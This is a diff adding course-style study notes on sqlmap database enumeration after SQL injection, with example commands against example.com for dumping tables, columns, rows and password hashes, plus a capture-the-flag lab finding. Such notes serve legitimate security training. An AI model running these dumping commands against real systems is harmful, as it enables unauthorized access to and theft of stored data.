@@ -543,3 +543,69 @@ which resulted in the flag:
 
 I also tried specifying the `--union-cols=9` to match the table output
 
+## Database Enumeration 
+
+enumeration happens after successful detection and confirmation of exploitability of SQLi vulnerability   
+lookup and retrieval of all available info from the vulnerable database 
+
+sqlmap has a predefined set of queries for all supported DBMSs where each entry has the SQL that must be run to get the desired content 
+
+after successful detection of vulnerability, we can begin enumeration of basic details like hostname of the target `--hostname`, current user's name (`--current-user`), current database name (`--current-db`), or password hashes (`--passwords`) 
+
+usually starts with basic info: 
+- database version banner `--banner` 
+- current user name `--current-user`
+- current database name `--current-db` 
+- checking if current user has DBA rights 
+
+to do all of this you can use the following command: 
+
+`sqlmap -u "http://example.com/?id=1" --banner --current-user --current-db --is-dba`
+
+### Table enumeration 
+
+after finding the current database name, the retrieval of table names can be done by using `--tables` and specifying the DB name with `-D testdb`
+
+`sqlmap -u "http://example.com/?id=1" --tables -D testdb`
+
+you can then retrieve a specific table's content with `--dump` and specifying the table with `-T users`: 
+
+`sqlmap -u "http://example.com/?id=1" --dump -T users -D testdb`
+
+this will output to csv but you can specify the output format with the option `--dump-format` and setting it to HTML or SQLite 
+
+### Table/row enumeration 
+
+if we have a large table with many columns or rows we can specify the columns like `name` with the `-C` option: 
+
+`sqlmap -u http://example.com/?id=1" --dump -T users -D testdb -C name,surname`
+
+to narrow down the rows based on their ordinal numbers we can use `--start` and `--stop`: 
+
+`sqlmap -u "http://example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3`
+
+### Conditional enumeration 
+
+we can get certain rows using WHERE logic with the `--where` option: 
+
+`sqlmap -u ... --dump -T users -D testdb --where="name LIKE 'f%'"`
+
+### Full DB enumeration 
+
+we can also retrieve all tables inside the database by skipping the usage of `-T` by just using the `--dump` option without specifying a table  
+
+`--dump-all` will dump all content from all the databases   
+in these cases, users are suggested to use the `--exclude-sysdbs`, which will skip the retrieval of content from system databases 
+
+for this module we will look at case 1 which wants us to exploit the parameter id: 
+
+![](../Images/Pasted%20image%2020240108210359.png)
+
+we are looking for a flag in the testdb database so first lets check for vulnerabilities: 
+
+![](../Images/Pasted%20image%2020240108210753.png)
+
+we know that we are looking for the testdb database and flag1 table so when we specify them we can see the flag: 
+
+![](../Images/Pasted%20image%2020240108210831.png)
+
